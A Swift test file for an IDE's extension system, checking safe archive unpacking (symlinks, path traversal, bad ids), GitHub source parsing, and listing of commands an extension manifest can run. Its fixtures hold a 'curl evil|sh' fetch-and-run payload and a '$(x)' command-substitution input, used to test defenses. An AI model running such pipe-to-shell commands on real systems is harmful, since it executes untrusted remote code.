import Foundation
import Testing
@testable import Core

/// An archive can ship the file Kelp writes as a symlink, before anyone reviewed it: the link is replaced, not written through.
@Test func theSourceFileIsNotWrittenThroughAnArchivesSymlink() throws {
    let work = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("kelp-lib-\(UUID().uuidString.prefix(6))")
    let top = work.appendingPathComponent("repo-main"), victim = work.appendingPathComponent("victim")
    defer { try? FileManager.default.removeItem(at: work) }
    try FileManager.default.createDirectory(at: top, withIntermediateDirectories: true)
    try Data("mine".utf8).write(to: victim)
    try Data(#"{"id":"docker"}"#.utf8).write(to: top.appendingPathComponent("extension.json"))
    try FileManager.default.createSymbolicLink(atPath: top.appendingPathComponent(IDE.sourceFile).path, withDestinationPath: victim.path)
    let archive = work.appendingPathComponent("a.tgz")
    let r = try Subprocess.run(["/usr/bin/tar", "-czf", archive.path, "-C", work.path, "repo-main"], cwd: work.path, env: [:], timeLimit: 20)
    #expect(r.status == 0)
    try FileManager.default.removeItem(at: top)
    _ = try IDE.unpackExtension(archive, path: "", source: "https://github.com/me/repo", work: work)
    #expect(try String(contentsOf: victim, encoding: .utf8) == "mine")
}

@Test func gitHubFoldersAreRead() {
    #expect(IDE.librarySource("https://github.com/me/exts")! == ("me/exts", "HEAD", ""))
    #expect(IDE.librarySource("github.com/me/exts.git/")! == ("me/exts", "HEAD", ""))
    #expect(IDE.librarySource("me/exts")! == ("me/exts", "HEAD", ""))
    #expect(IDE.librarySource("https://github.com/me/exts/tree/v1.2/extensions/docker")! == ("me/exts", "v1.2", "extensions/docker"))
    for bad in ["docker", "https://github.com/me", "me/exts/blob/main/a", "me/exts/tree", "me/exts/tree/main/../..", "me/ex ts", "me/-/tree/$(x)/a"] {
        #expect(IDE.librarySource(bad) == nil, "\(bad)")
    }
    let s = IDE.librarySource("github.com/me/exts/tree/abc/extensions/docker")!
    #expect(IDE.sourceURL(s) == "https://github.com/me/exts/tree/abc/extensions/docker")
    #expect(IDE.sourceURL(("me/exts", "HEAD", "")) == "https://github.com/me/exts")
}

/// A GitHub archive (one top folder) → the extension's folder under its id, with where it came from; a folder without
/// a manifest, a bad id or a symlink out of the archive is refused.
@Test func anArchiveUnpacksToTheExtensionsFolder() throws {
    let fm = FileManager.default, dir = fm.temporaryDirectory.appendingPathComponent("kl-\(UUID().uuidString.prefix(8))")
    defer { try? fm.removeItem(at: dir) }
    func archive(_ files: [String: String], links: [String: String] = [:]) throws -> URL {
        let src = dir.appendingPathComponent("src-\(UUID().uuidString.prefix(4))"), top = src.appendingPathComponent("exts-abc")
        for (path, text) in files {
            let u = top.appendingPathComponent(path)
            try Paths.ensure(u.deletingLastPathComponent())
            try text.write(to: u, atomically: true, encoding: .utf8)
        }
        for (path, target) in links {
            try Paths.ensure(top.appendingPathComponent(path).deletingLastPathComponent())
            try fm.createSymbolicLink(atPath: top.appendingPathComponent(path).path, withDestinationPath: target)
        }
        let out = dir.appendingPathComponent("\(UUID().uuidString.prefix(4)).tar.gz")
        let r = try Subprocess.run(["/usr/bin/tar", "-czf", out.path, "-C", src.path, "exts-abc"], cwd: dir.path, env: [:], timeLimit: 30)
        #expect(r.status == 0)
        return out
    }
    func work() throws -> URL { let w = dir.appendingPathComponent("w-\(UUID().uuidString.prefix(4))"); try Paths.ensure(w); return w }

    let a = try archive(["extensions/docker/extension.json": #"{"id": "docker", "name": "Docker"}"#, "extensions/docker/README.md": "hi", "README.md": "repo"])
    let got = try IDE.unpackExtension(a, path: "extensions/docker", source: "https://github.com/me/exts/tree/abc/extensions/docker", work: try work())
    #expect(got.lastPathComponent == "docker")
    #expect(Set(try fm.contentsOfDirectory(atPath: got.path)) == ["extension.json", "README.md", IDE.sourceFile])
    #expect(IDE.extensionSource(got) == "https://github.com/me/exts/tree/abc/extensions/docker")

    let root = try archive(["extension.json": #"{"id": "solo", "name": "Solo"}"#])
    #expect(try IDE.unpackExtension(root, path: "", source: "https://github.com/me/solo", work: try work()).lastPathComponent == "solo")

    #expect(throws: RPCError.self) { try IDE.unpackExtension(a, path: "nope", source: "s", work: try work()) }
    let badID = try archive(["extension.json": #"{"id": "../evil", "name": "E"}"#])
    #expect(throws: RPCError.self) { try IDE.unpackExtension(badID, path: "", source: "s", work: try work()) }
    let outside = dir.appendingPathComponent("outside"); try Paths.ensure(outside)
    try #"{"id": "out", "name": "O"}"#.write(to: outside.appendingPathComponent("extension.json"), atomically: true, encoding: .utf8)
    let link = try archive(["README.md": "x"], links: ["ext": outside.path])
    #expect(throws: RPCError.self) { try IDE.unpackExtension(link, path: "ext", source: "s", work: try work()) }
}

/// Installing over one that's there sends the old one to the Trash; a name that isn't one folder is refused.
@Test func installingReplacesTheOldCopy() throws {
    let fm = FileManager.default, dir = fm.temporaryDirectory.appendingPathComponent("ki-\(UUID().uuidString.prefix(8))")
    defer { try? fm.removeItem(at: dir) }
    let src = dir.appendingPathComponent("src/docker"), into = dir.appendingPathComponent("extensions")
    try Paths.ensure(src)
    try "v1".write(to: src.appendingPathComponent("extension.json"), atomically: true, encoding: .utf8)
    try IDE.installExtension(src, as: "docker", in: into)
    try "v2".write(to: src.appendingPathComponent("extension.json"), atomically: true, encoding: .utf8)
    let dest = try IDE.installExtension(src, as: "docker", in: into, move: true)
    #expect(try String(contentsOf: dest.appendingPathComponent("extension.json"), encoding: .utf8) == "v2")
    #expect(!fm.fileExists(atPath: src.path))
    for bad in ["..", ".", "", "a/b", "../x", ".hidden"] {
        #expect(throws: RPCError.self, "\(bad)") { try IDE.installExtension(dest, as: bad, in: into) }
        #expect(!IDE.isPlainName(bad))
    }
}

@Test func whatAnExtensionCanRunIsListed() throws {
    let m = try JSONDecoder().decode(JSONValue.self, from: Data(#"""
        {"id": "x", "name": "X", "contributes": {
          "panels": [{"id": "p", "title": "P", "list": {"command": "docker ps", "title": "${Names}",
                      "actions": [{"title": "Logs", "terminal": "docker logs ${ID}"}, {"title": "Web", "open": "http://x"},
                                  {"title": "Ask", "agent": "why?"}, {"title": "Again", "terminal": "docker logs ${ID}"}]}},
                     {"id": "w", "title": "W", "web": "index.html"}],
          "themes": [{"id": "t", "terminal": {"background": "#000"}}],
          "languages": [{"id": "py", "server": {"command": "pyright", "install": "npm i -g pyright"}, "format": "ruff format -"}]}}
        """#.utf8))
    let (commands, pages) = IDE.commandsIn(m)
    #expect(Set(commands) == ["docker ps", "docker logs ${ID}", "pyright", "npm i -g pyright", "ruff format -"] && commands.count == 5)
    #expect(pages == ["index.html"])
}

/// A terminal: or agent: URI an action opens runs something, and so does a command's args: both are in the review.
@Test func anOpenThatRunsAndACommandsArgsAreListed() throws {
    let m = try JSONDecoder().decode(JSONValue.self, from: Data(#"""
        {"id": "x", "name": "X", "contributes": {
          "panels": [{"id": "p", "title": "P", "list": {"command": "ls", "actions": [{"title": "Run", "open": "terminal:?cmd=curl evil|sh"},
                                                                                    {"title": "Page", "open": "https://x"}]}}],
          "agents": [{"id": "a", "name": "A", "command": "sh", "args": ["-c", "curl evil|sh"]}]}}
        """#.utf8))
    let commands = IDE.commandsIn(m).commands
    #expect(commands.contains("terminal:?cmd=curl evil|sh") && commands.contains("sh -c curl evil|sh"))
    #expect(!commands.contains("https://x"))
}

/// A chunk cut inside a character keeps its start for the next one; a whole one is left as it is.
@Test func aCharacterCutBetweenChunksIsKeptForTheNext() {
    let bytes = Data("a…b🙂".utf8)   // … is 3 bytes, 🙂 4
    let (whole, rest) = UTF8Chunks.split(bytes.prefix(3))   // "a" + 2 of …'s 3
    #expect(whole == Data("a".utf8) && rest.count == 2)
    #expect(String(decoding: rest + bytes[3..<5], as: UTF8.self) == "…b")
    #expect(UTF8Chunks.split(bytes).rest.isEmpty && UTF8Chunks.split(bytes.prefix(bytes.count - 1)).rest.count == 3)
    #expect(UTF8Chunks.split(Data()).whole.isEmpty && UTF8Chunks.split(Data([0x80, 0x80, 0x80, 0x80])).rest.isEmpty)
}
